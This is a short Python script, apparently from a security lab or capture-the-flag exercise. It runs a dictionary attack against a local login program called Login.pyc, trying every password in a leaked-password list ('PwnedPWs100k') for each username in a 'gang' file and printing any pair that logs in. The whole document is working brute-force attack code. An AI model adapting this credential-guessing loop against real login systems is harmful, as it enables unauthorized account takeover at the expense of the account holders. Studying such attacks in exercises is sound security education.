from datetime import datetime
import subprocess


start = datetime.now()
passwordslist = open("PwnedPWs100k", "r")
ganguser = open("gang", "r")
passwords = passwordslist.readlines()
gangs = ganguser.readlines()

for gangmember in gangs:
    gangmember = gangmember.strip()
    if (gangmember == "Adam" or gangmember == "Vlad"):
            continue
    for password in passwords:
        password = password.strip()
        result = subprocess.run(["python3", "Login.pyc", gangmember, password], capture_output=True)
        if "Login successful" in result.stdout.decode():
           print(f"\nSuccessful Username: {gangmember}\nSuccessful Password: {password}\n")
           break

end = datetime.now()
print("Start time: {}".format(start.strftime("%H:%M:%S")))
print("End time: {}".format(end.strftime("%H:%M:%S")))
